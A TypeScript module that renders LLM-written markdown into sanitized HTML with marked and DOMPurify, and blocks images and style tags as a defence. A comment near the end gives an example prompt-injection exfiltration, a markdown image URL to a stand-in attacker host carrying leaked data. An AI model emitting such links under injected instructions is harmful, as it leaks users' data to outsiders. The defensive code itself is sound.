import { Marked } from 'marked';
import DOMPurify from 'dompurify';

/**
 * Markdown → sanitized HTML for assistant/summary content.
 *
 * GitHub-flavoured markdown (tables, task lists, strikethrough, nested lists)
 * via `marked`, then DOMPurify: the text comes from an LLM fed with
 * transcripts, so it is untrusted (no `javascript:` links, no inline
 * handlers). Styling lives in index.css under `.markdown-content`.
 *
 * Task-list checkboxes get the `checkbox-toggle` class and are left enabled:
 * InteractiveMarkdown maps a click on the Nth one back to the Nth `- [ ]`
 * of the source.
 */
const marked = new Marked({
  gfm: true,
  // LLMs often rely on single newlines as line breaks.
  breaks: true,
  renderer: {
    checkbox({ checked }) {
      return `<input type="checkbox" class="checkbox-toggle"${checked ? ' checked' : ''}> `;
    },
    listitem(item) {
      if (!item.task) return false;
      return `<li class="task-item${item.checked ? ' task-done' : ''}">${this.parser.parse(item.tokens)}</li>\n`;
    },
  },
});

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A' && node.getAttribute('href')) {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

export function formatMarkdown(text: string): string {
  const html = marked.parse(text || '', { async: false });
  // No images: a prompt-injected transcript could make the LLM emit
  // ![](https://attacker/?leak=...) and the browser would fetch it.
  return DOMPurify.sanitize(html, { ADD_ATTR: ['target'], FORBID_TAGS: ['img', 'style'] });
}
